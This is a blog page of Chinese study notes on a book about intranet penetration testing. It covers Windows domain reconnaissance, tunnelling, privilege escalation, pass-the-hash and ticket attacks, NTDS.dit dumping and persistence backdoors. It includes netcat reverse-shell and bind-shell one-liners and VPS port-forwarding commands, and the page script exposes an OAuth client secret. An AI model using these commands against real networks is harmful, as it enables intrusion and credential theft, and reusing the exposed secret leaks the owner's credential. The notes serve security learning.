@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>《内网安全攻防-渗透测试实战指南》笔记 | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="强力推荐这本书，都是能在实战中运用到的知识。
+第一章 内网渗透测试基础
+工作组，可以随便加入退出
+域，想要访问域中的资源，就要以合法的身份登陆域
+域控制器，DC，域控，所有的身份验证都在DC上面进行，DC上面储存着域中所有的账号和密码散列值..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">《内网安全攻防-渗透测试实战指南》笔记</h2>
+            <div class="post-date">2020-06-17</div>
+            
+            <div class="post-content" v-pre>
+              <p>强力推荐这本书，都是能在实战中运用到的知识。</p>
+<h2 id="第一章-内网渗透测试基础"><strong>第一章 内网渗透测试基础</strong></h2>
+<p>工作组，可以随便加入退出</p>
+<p>域，想要访问域中的资源，就要以合法的身份登陆域</p>
+<p>域控制器，DC，域控，所有的身份验证都在DC上面进行，DC上面储存着域中所有的账号和密码散列值</p>
+<p>单域、父域和子域（子域名），域树，域森林，域名服务器——域中的计算机都是使用DNS来定位域控制器、服务器及其他计算机、网络服务的。</p>
+<p>活动目录，相当于字典的索引，存储着网络中所有资源的快捷方式，用户可以通过快捷方式来定位资源。域树内的所有域共享一个活动目录。活动目录提供账号集中管理、软件集中管理、环境集中管理、增强安全性、更可靠，更短的宕机时间。</p>
+<p>域控制器本身通常是指软件本身，其中Active Directory是指该软件提供的服务。</p>
+<p>DMZ，隔离区，是外网和内网中间的区域</p>
+<p>域中的计算机的分类：域控制器、成员服务器、客户机、独立服务器</p>
+<p>域内权限：域本地组、全局组、通用组</p>
+<p>比较重要的域本地组权限：管理员组、远程登陆组、打印机操作员组、域管理员组、结构管理员组。</p>
+<p>虚拟机网卡模式：桥接（虚拟机与物理机身份相同）、NAT（虚拟机通过物理机连接，使用物理机网卡），Host-only（相当于本地建设了一个局域网，局域网可以通过物理机的网络分享来上网）</p>
+<p>还有一些不同操作系统下内网渗透的常用工具。</p>
+<h2 id="第二章-内网信息收集"><strong>第二章 内网信息收集</strong></h2>
+<p><strong>信息收集的深度直接关系到内网渗透测试的成败</strong></p>
+<p>在进入内网之后首先要对当前所处的网络环境进行判断。</p>
+<p><strong>我是谁</strong>————当前机器角色的判断（web服务器？生产服务器？</p>
+<p><strong>这是哪</strong>————对当前机器所在网络环境的拓扑结构进行分析和判断</p>
+<p><strong>我在哪</strong>————对当前机器所处区域的判断（DMZ？生产区？办公区？</p>
+<p><strong>收集本机信息</strong>：操作系统、权限、IP地址、杀毒软件、端口、服务、补丁、网络连接、共享</p>
+<p><strong>查询当前权限</strong></p>
+<p>whoami</p>
+<p>whoami /all</p>
+<p>net user XXX /domain</p>
+<p><strong>判断域是否存在</strong></p>
+<p>ipconfig /all</p>
+<p>systeminfo</p>
+<p>net config workstation</p>
+<p>net time /domian</p>
+<p><strong>探测域内存活主机</strong></p>
+<p>1、利用NetBIOS协议探测，nbtscan</p>
+<p>2、利用ICMP协议，也就是PING</p>
+<p>3、通过ARP</p>
+<p>arpscan</p>
+<p>Empire中的arpscan</p>
+<p>Nishang中的脚本</p>
+<p>4、通过常规的TCP/UDP端口扫描内网，scanline</p>
+<p><strong>扫描域内端口</strong></p>
+<p>1、telnet命令扫描。   telnet DC 3389</p>
+<p>2、S扫描器</p>
+<p>3、Metasploit</p>
+<p>4、Powersploit 的 PS脚本</p>
+<p>5、Nishang的端口扫描模块</p>
+<p>获取到端口的Banner信息之后就可以找EXP，exploitDB、seebug</p>
+<p><strong>收集域内基础信息 以下都需要域认证所以说需要域用户或者是本地system权限</strong></p>
+<p>net veiw /domain 查询域</p>
+<p>net view /domain:HACK 查询域内所有计算机</p>
+<p>net group /domain 查询域内所有用户组列表</p>
+<p>net group “domain computers” /domain 查询所有域成员计算机列表</p>
+<p>net account /domain  获取域密码信息</p>
+<p>nltest /doamin_trusts  获取域信任信息</p>
+<p><strong>查找域控制器</strong></p>
+<p>letest /DCLIST:HACK  查看域控制器的机器名</p>
+<p>Nslookup -type=SRV _ldap._tcp    查看与控制器的主机名</p>
+<p>net time /domain  查看当前时间</p>
+<p>net group &quot;domain controllers&quot; /domain  查看域控制器组，一般都会有两个以上，因为要防灾</p>
+<p>netdom query pdc</p>
+<p><strong>获取域内的用户和管理员信息</strong></p>
+<p>net user /domain 向域控制器查询</p>
+<p>net gourp “Enterprise Admins” /domain  查询管理员用户组</p>
+<p><strong>定位域管理员</strong></p>
+<p>当计算机加入域中，域管理员会被赋予本地系统管理员权限。</p>
+<p>定位域管理员的常规渠道，一是日志，二是会话。</p>
+<p>常用工具psloggedon.exe、PAEFindADUser.exe、netsess.exe、hunter、NetView、Nmap的NSE脚本，在PowerShell中，常用的工具是PowerView。</p>
+<p><strong>查找域管理进程</strong></p>
+<p>在渗透测试中，典型的域权限提升过程，通常是围绕着收集明文凭据或者通过mimikatz提权等方法，在获取了管理员权限的系统中寻找域管理员登录进程，进而收集域管理员的凭据，如果说当前的系统中没有获得域管理员进程，而且当前的账户也不是域管理员账户，那么就只可以看看当前的账户在哪台机器上是管理员，再去另外一台机器试试机会。直到找到可以获取到域管理员的路径（方法）。</p>
+<p>1、net group “Domian Admins” /domain  获取域管理员列表</p>
+<p>2、tasklist /v  列出本机所有进程以及进程用户</p>
+<p>3、寻找用户为域管理员的进程。</p>
+<p>查询域控制器的域用户会话</p>
+<p>1、net group “Domain Controllers” /domain 查询域控制器列表。</p>
+<p>2、net group “Domian Admins” /domain  获取域管理员列表</p>
+<p>3、NetSess -h</p>
+<p>4、交叉引用域管理员列表与活动会话列表</p>
+<p>通过扫描NetBIOS信息，有些版本的win允许用户通过NetBIOS查询已登录用户。</p>
+<p><strong>域管理员模拟方法</strong></p>
+<p>PowerShell介绍，是脚本环境，想要执行脚本就要修改PowerShell的执行权限，有四种模式</p>
+<ul>
+<li>Restricted：默认设置，不允许执行任何脚本</li>
+<li>Allsigned： 只能运行经过证书验证的脚本</li>
+<li>Unrestricted：权限最高，可以执行任意脚本</li>
+<li>RemoteSigned：对本地的脚本不做限制；对来自网络的脚本必须验证其签名。</li>
+</ul>
+<p>Get-ExecutionPolicy   查看当前ps的执行权限。</p>
+<p>Set-ExecutionPolicy Unrestriceted</p>
+<p>Import-Module .\PowerView.ps1 导入pv脚本</p>
+<p><strong>域分析工具BloodHound</strong></p>
+<p>信息收集、图形化界面、查找到域管理员的最短路径</p>
+<h2 id="第三章-隐藏通信隧道技术"><strong>第三章 隐藏通信隧道技术</strong></h2>
+<p>隐藏通信隧道，这里的隧道的意思，一种绕过端口屏蔽的通信方式，将数据包封装成防火墙允许的类型或者端口，与对方通信，到达目的地时将数据包还原，并将数据包发送到目的地址。</p>
+<p>常用的隧道列举如下：</p>
+<ul>
+<li>网络层：IPv6隧道，ICMP隧道、GRE隧道</li>
+<li>传输层：TCP隧道、UDP隧道、常规端口转发。</li>
+<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
+</ul>
+<p>判断内网的连通性，要综合判断。</p>
+<p>1、ICMP协议，就是PING</p>
+<p>2、TCP协议，netcat</p>
+<p>3、HTTP协议，curl</p>
+<p>4、DNS协议， nslookup <a href="http://www.baidu.com">www.baidu.com</a> vps-ip、dig @vps-ip www.baidu.com</p>
+<h3 id="网络层隧道技术"><strong>网络层隧道技术</strong></h3>
+<p>1、IPv6隧道</p>
+<p>就是在IPv6的报文中隐藏IPv4的报文。相关工具socat、6tunnel、nt6tunnel等。</p>
+<p>2、ICMP隧道</p>
+<p>ICMP通讯不需要开放端口</p>
+<ul>
+<li>
+<p>icmpsh</p>
+</li>
+<li>
+<p>Pingtunnel</p>
+</li>
+<li>
+<p>防御方法</p>
+<p>检测同一来源的ICMP数据包的数量，一个正常的ping每秒最多2个数据包。</p>
+<p>检测大于64bit的ICMP数据包</p>
+<p>检测响应数据包和请求数据包中的Payload不一致的ICMP数据包</p>
+<p>检测ICMP数据包的协议标签。</p>
+</li>
+</ul>
+<h3 id="传输层隧道技术"><strong>传输层隧道技术</strong></h3>
+<p><strong>1、lcx端口转发</strong></p>
+<p>内网端口转发</p>
+<p>lcx.exe -slave <Pubilc IP> 4444 127.0.0.1 3389  //将3389的端口映射到4444上</p>
+<p>lcx.exe -listen 4444 5555 将4444端口监听的数据转发到5555端口上</p>
+<p>以上可以完成 访问VPS的5555就可以连接到第一台主机的3389端口</p>
+<p>本地端口转发</p>
+<p>lcx -tran 53 &lt;目标自身IP&gt;  3389</p>
+<p>以上可以完成访问53端口来登录远程桌面</p>
+<p><strong>2、netcat</strong></p>
+<p>banner抓取（直接nc ip 端口）、连接远程主机、端口扫描（就是banner抓取）、端口监听、文件传输</p>
+<p>正向shell</p>
+<p>被控主机：nc -lvp 4444 -e /bin/sh</p>
+<p>攻击机：    nc ip 4444</p>
+<p>反向shell</p>
+<p>nc -lvp 9999</p>
+<p>nc <IP> 9999 -e /bin/sh</p>
+<p>python反向shell</p>
+<p>bash反向shell</p>
+<p>php反向shell</p>
+<p>perl反向shell</p>
+<p>内网代理</p>
+<p>VPS： nc -lvp 3333</p>
+<p>database: nc -lvp 3333 -e /bin/sh</p>
+<p>web: nc -v &lt;VPS_IP&gt; 3333 -c “nc -v &lt;database_IP&gt; 3333”</p>
+<p>以上可以让kali连接到database的shell</p>
+<p>powercat</p>
+<h3 id="应用层隧道技术"><strong>应用层隧道技术</strong></h3>
+<p><strong>SSH协议</strong></p>
+<p>本地转发</p>
+<p>ssh -CfNg -L 1553(VPS port):1.1.1.10(target):3389(target port) root@192.168.1.11(jump PC) → enter password</p>
+<p>以上在VPS中执行，在内网有一个可控主机而且ssh打开知道密码的情况下，可以使用ssh来完成本地转发。</p>
+<p>远程转发</p>
+<p>VPS不能够访问内网。</p>
+<p>在内网跳板执行，主动连接VPS和target</p>
+<p>动态转发</p>
+<p>也就是变成代理，VPS直接可以使用跳板机作为代理服务器</p>
+<ul>
+<li>
+<p>防御思路</p>
+<p>SSH远程管理白名单</p>
+</li>
+</ul>
+<p><strong>HTTP/HTTPS协议</strong></p>
+<p>reGeorg、meterpreter、tunna等。</p>
+<p><strong>DNS协议</strong></p>
+<p>C&amp;C（command &amp; control）服务器。</p>
+<p>工具dnscat2、iodine</p>
+<p><strong>SOCKS代理</strong></p>
+<p>1、EarthWorm</p>
+<p>2、reGeorg</p>
+<p>3、sSocks</p>
+<p>4、SocksCap64</p>
+<p>5、Proxifier</p>
+<p>6、ProxyChains</p>
+<p><strong>EW应用</strong></p>
+<p>ew -s ssocksd -l 888</p>
+<p>有外网的直接用这个，VPS直接将服务器的888作为代理，直接内网漫游。</p>
+<p>ew -s rcsocks -l 1008 -e 888</p>
+<p>在VPS中执行，这个就是将1080收到的代理请求转发到888端口</p>
+<p>ew -s rssocks -d &lt;VPS_IP&gt; -e 888</p>
+<p>在内网机器使用，就是启动SOCKS5然后将其反弹到VPS的888端口</p>
+<p>win下SocksCap64实现内网漫游，linux下proxychains实现内网漫游，其实就是一堆代理</p>
+<p>压缩数据</p>
+<p>rar、7-zip</p>
+<p>上传下载</p>
+<p>1、FTP上传</p>
+<p>2、VBS上传</p>
+<p>3、Debug上传，原理就是将exe转换成十六进制，然后再用debug编译回exe</p>
+<p>4、Nishang上传，原理也是十六进制</p>
+<p>5、利用bitsadmin下载，win自导工具，用来下载系统更新的。</p>
+<p>6、利用PowerShell下载。</p>
+<h2 id="第四章-权限提升分析及防御"><strong>第四章 权限提升分析及防御</strong></h2>
+<p>在windows中权限大概分为四种：User、Administrator、System、TrustedInstaller。</p>
+<p>常见的提权方法有系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、Web中间件漏洞提权、DLL劫持提权、滥用高权限令牌提权、第三方软件/服务提权等。</p>
+<h3 id="系统内核溢出漏洞提权"><strong>系统内核溢出漏洞提权</strong></h3>
+<p>通过缺失补丁</p>
+<p>手动检查补丁</p>
+<p>Metasploit、Windows Exploit Suggester、sherlock</p>
+<h3 id="windows操作系统配置错误利用分析"><strong>Windows操作系统配置错误利用分析</strong></h3>
+<p>1、<strong>系统服务权限配置错误：服务以高权限运行，但是可执行文件可写。</strong></p>
+<p>有两种可能：</p>
+<ul>
+<li>服务未运行：攻击者替换可执行文件，然后重启服务</li>
+<li>服务已运行且无法终止：利用DLL劫持技术并尝试重启服务提权</li>
+</ul>
+<p>工具：PowerUp、Metasploit</p>
+<p>2、<strong>注册表键AlwaysInstallElevated</strong></p>
+<p>原理是允许低权限的用户以system权限运行安装文件。</p>
+<p>工具：PowerUp</p>
+<p>3、<strong>可信任服务路径漏洞</strong></p>
+<p>就是没带引号的那个，服务要是没有带引号而且有空格，执行的软件就会出问题。</p>
+<p>工具：Metasploit</p>
+<p>4、<strong>自动安装配置文件</strong></p>
+<p>网络管理员为了方便会批量的部署内网环境，在其中使用的配置文件中可能包含有，本地管理员的账号和密码信息，而且这种信息同时可以在相同安装环境的主机下。</p>
+<p>5、<strong>计划任务</strong></p>
+<p>跟高级服务的那个差不多，计划任务是高权限用户在执行，低权限用户修改其执行文件。</p>
+<p>6、<strong>Empire内置模块，PowerUp</strong></p>
+<h3 id="组策略首选项提权分析"><strong>组策略首选项提权分析</strong></h3>
+<p>组策略修改密码，密码强度虽然提高，但是多个本地管理员的密码都会是相同的。</p>
+<p>管理员在域中新建一个组策略之后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。此密码使用AES-256加密算法，但是微软已经公开其私钥，这意味着任何用户都可以访问保存在XML文件中的密码并将其解密。</p>
+<p>工具：PowerSploit、Metasploit、Empire。</p>
+<h3 id="绕过uac提权"><strong>绕过UAC提权</strong></h3>
+<p>UAC就是平时安装软件会弹出来的那个东西。</p>
+<p>工具：Metasploit-bypassuac模块、RunAs模块、Nishang中的Invoke-PsUACme模块、Empire中的bypassuac模块。</p>
+<h3 id="令牌窃取分析及防范">令牌窃取分析及防范</h3>
+<p>不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝</p>
+<p>Metasploit中“use incognito”，然后“list_token -u”，列出可用令牌，调用impersonate_token，执行“shell”之后就获取的系统管理员权限了。</p>
+<p><strong>Rotten Potato本地提权</strong></p>
+<p><strong>添加域管理员</strong></p>
+<p>假设网络中设置了域管理进程，使用migrate命令迁移到此进程。输入“shell”，进入命令行界面，就可以添加用户到域管理员组了。</p>
+<p><strong>Empire下的令牌窃取分析</strong></p>
+<p>mimikatz可以利用正在运行的进程来窃取域用户的令牌。</p>
+<p><strong>无凭证条件下的权限获取分析</strong></p>
+<p>LLMNR和NetBIOS欺骗，来获取Net-NTLM Hash。</p>
+<p>DNS服务器发生故障的时候，会退回使用 LLMNR和NetBIOS，此时可以使用responder来监听抓取相应中的Net-NTLM Hash，使用hashcat破解之后获取明文横向移动</p>
+<h2 id="第五章-域内横向移动分析及防御">第五章 域内横向移动分析及防御</h2>
+<p><strong>IPC</strong></p>
+<p>利用条件：</p>
+<p>用户名密码、开启了139、455端口。管理员开启了默认共享。</p>
+<p>dir、tasklist、at、schtasks。</p>
+<p><strong>Windows系统散列值获取分析与防范</strong></p>
+<p>LM Hash（DES） 和 NTLM Hash（MD4）</p>
+<p>想要在win中抓取散列值或明文密码，必须将权限提升至system。本地用户名、散列值和其他安全验证信息都保存在SAM文件中。可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p>
+<p>SAM文件保存的位置是C:\Windows\System32\config。可以在关闭win之后通过PE系统复制文件，也可以使用VSS等方法进行复制。</p>
+<p>工具：GetPass、PwDump7、QuarksPwDump、PowerShell</p>
+<p>通过SAM和System文件抓取密码：mimikatz</p>
+<p><strong>使用Hashcat获取密码</strong></p>
+<p>就是破解密码</p>
+<p><strong>哈希传递攻击</strong></p>
+<p>该方法通过找到与账户相关的密码散列值来进行攻击，在win中散列值就是用来证明身份的。攻击者往往会使用工具将散列值传递到其他计算机中，进行权限验证，实现对远程计算机的控制。</p>
+<p>还是在<strong>使用mimikatz</strong>，<strong>但是哈希传递是需要本地管理员权限的。</strong></p>
+<p><strong>票据传递攻击分析</strong></p>
+<p>从内存中换掉票据</p>
+<p>mimikatz、kekeo</p>
+<p>哈希传递攻击和票据传递攻击的区别就是，hash传递利用的是从当前计算机中获取的hash来进行认证。票据是票据，有效性是有时间限制的。</p>
+<p><strong>PsExec</strong></p>
+<p>需要连接IPC、需要开启admin$共享</p>
+<p>windows提供的工具，所以说再杀毒软件的白名单中。</p>
+<p>Meatasploit中也有相对应模块。</p>
+<p><strong>WMI</strong></p>
+<p>需要密码，重点是不会产生日志</p>
+<p><strong>永恒之蓝</strong></p>
+<p>Metasploit</p>
+<p><strong>smbexec</strong></p>
+<p>通过<em>文件共享</em>在远程系统中执行命令。需要用户名密码。</p>
+<p><strong>DCOM</strong></p>
+<p>还是要通过IPC连接</p>
+<p><strong>SPN（ServicePrincipal Names）</strong></p>
+<p>域内的每种资源都会被分配不同的SPN，使用对应的SPN服务需要通过Kerberos身份验证来获取对应的票据，从而访问相应的服务。</p>
+<p><strong>Exchange邮件服务器</strong></p>
+<p>源码、明文密码、VPN配置、敏感业务</p>
+<p><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/#PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB">https://ares-x.com/2020/03/21/域渗透学习（七）PTT-票据传递攻击/#PTT-票据传递攻击</a></p>
+<p><strong>第六章 域控制器安全</strong></p>
+<p>通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\Windows\NTDS\ntds.dit文件。使用Windows本地卷影拷贝服务，就可以获得文件的副本。</p>
+<p>ntds文件中包含着用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM一样是被系统锁定的。</p>
+<p><strong>提取方法：</strong></p>
+<p>通过ntdsutil.exe提取，原理是创建快照。</p>
+<p>通过vssadmin提取，原理也是创建卷影。</p>
+<p>通过vssown.vbs脚本提取，与vssadmin类似。</p>
+<p>通过ntdsutil的IFM创建卷影拷贝。</p>
+<p>使用diskshadow导出，也是卷影copy。</p>
+<p><strong>导出ntds.dit中的散列值</strong></p>
+<p>使用esedbexport</p>
+<p>使用impacket工具包</p>
+<p>使用NTDSDumpex.exe导出</p>
+<p><strong>利用dcsunc获取域散列值</strong></p>
+<p>使用mimikatz转储域散列值。</p>
+<p>使用dcsync</p>
+<p><strong>使用Metasploit</strong></p>
+<p>使用vshadow.exe和QuarksPwDump.exe导出域账号和域散列值</p>
+<p><strong>Kerberos域用户提权漏洞</strong></p>
+<p>攻击者获取了域内任意机器的权限，并且知道任意域用户的SID、用户名、密码就可以提权到任意域用户</p>
+<h2 id="第七章-跨域攻击分析及防御"><strong>第七章 跨域攻击分析及防御</strong></h2>
+<p>常见的跨域攻击方法：</p>
+<p>常规渗透（例如利用Web漏洞跨域获取权限）</p>
+<p>利用一直域散列值进行哈希传递或者票据传递攻击（例如域控制器本地管理员密码可能相同。）</p>
+<p>利用域信任关系进行跨域攻击。</p>
+<h2 id="第八章-权限维持分析及防御"><strong>第八章 权限维持分析及防御</strong></h2>
+<p>后门就是一个留在目标主机上的软件，它可以使攻击者随时与目标主机进行连接。</p>
+<h3 id="操作系统后门"><strong>操作系统后门</strong></h3>
+<p>粘滞键后门：替换windows\system32下的sethc.exe</p>
+<p>empire也可以实现这一功能。</p>
+<p>注册表注入后门，empire也可以实现这一功能。</p>
+<p>计划任务后门，schtasks。</p>
+<p>Metasploit中模拟计划任务后门、PowerSploit也可以。</p>
+<p>meterpreter后门</p>
+<p>Cymothoa后门</p>
+<p>WMI型后门</p>
+<p>WMI型后门只能由具有管理员权限的用户运行。WMI型后门的两个特征：无文件和无进程。原理是：代码加密存储在WMI中，达到所谓无文件，当设定的条件被满足时，系统将自动启动PS进程去执行后门程序，执行后，进程会消失。</p>
+<h3 id="web后门"><strong>WEB后门</strong></h3>
+<p>Nishang的WebShell</p>
+<p>weevely后门</p>
+<p>webacoo后门</p>
+<p>ASPX meterpreter后门</p>
+<p>PHP meterpreter后门</p>
+<h3 id="域控制器权限持久化分析"><strong>域控制器权限持久化分析</strong></h3>
+<p><strong>DSRM域后门</strong></p>
+<p>DSRM（目录服务恢复模式），每个域控制器都有一个本地管理员账户。DSRM用途是在出现故障的的时候还原、修复、重建活动目录数据库。DSRM的密码在DC安装的时候设置，很少被重置。在渗透环境中，可以使用DSRM账号对域环境进行持久化操作。</p>
+<p><strong>SSP维持域控权限</strong></p>
+<p>SSP(Security Support Provider)是Windows操作系统安全机制的提供者。是一个DLL文件，SSPI是SSP的API接口。LSA用作身份验证，在系统启动的时候，SSP被加载到lsass.exe中，攻击者可以通过拓展此DLL加入一些恶意的功能，使得用户在修改密码的时候，窃取用户的新密码。</p>
+<p><strong>Golden Ticket（黄金票据）</strong></p>
+<p>在域环境中，每个用户的票据都是krbtgt生成的，如果攻击者拿到了krbtgt的NTLM Hash或者AES-256值，就可以伪造域内任意用户的身份（甚至不存在的用户），并以该用户的身份访问其他服务。</p>
+<p><strong>因为KDC使用krbtgt用户的Hash作为密钥进行加密，生成TGT。</strong></p>
+<p>使用黄金票据进行票据传递攻击是，需要以下信息：</p>
+<p>需要伪造的用户名</p>
+<p>完整的域名</p>
+<p>域SID</p>
+<p>krbtgt的NTLM Hash 或 AES-256值</p>
+<p><strong>Silver Ticket（白银票据）</strong></p>
+<p>黄金票据使用krbtgt的散列值，去获取任意用户的票据。</p>
+<p>白银票据通过对应服务账号的散列值，去获取对应服务的权限。</p>
+<p><strong>最根本的原因就是服务的票据是通过服务自身的hash解密和加密的（使用的是对称密钥），加密的信息、方式、密钥都有了，伪造ticket那是很自然的事情。</strong></p>
+<p>需要掌握以下信息：</p>
+<p>域名</p>
+<p>域SID</p>
+<p>目标服务器的FQDN</p>
+<p>可利用的服务</p>
+<p>服务账号的NTLM Hash</p>
+<p>需要伪造的用户名</p>
+<p><strong>获取的权限不同</strong></p>
+<p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>
+银票：伪造的ST，只能访问指定的服务，如CIFS</p>
+<p><strong>认证流程不同</strong></p>
+<p>金票：同KDC交互，但不同AS交互<br>
+银票：不同KDC交互，直接访问Server</p>
+<p><strong>加密方式不同</strong></p>
+<p>金票：由krbtgt NTLM Hash 加密<br>
+银票：由服务账号 NTLM Hash 加密</p>
+<p><strong>Skeletion Key</strong></p>
+<p>万能密码</p>
+<p><strong>Hook PasswordChangeNotify</strong></p>
+<p>注入DLL，在用户改密码系统验证复杂性的环节窃取密码。</p>
+<p><strong>Nishang的脚本后门</strong></p>
+<p><strong>第九章 Cobalt Strike</strong></p>
+<p><a href="https://www.jianshu.com/p/4936da524040">黄金票据和白银票据攻击及其原理介绍 - 简书 (jianshu.com)</a></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/linux-yi-ju-hua-fan-dan-shell/">
+                  <h3 class="post-title">
+                    Linux一句话反弹shell
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
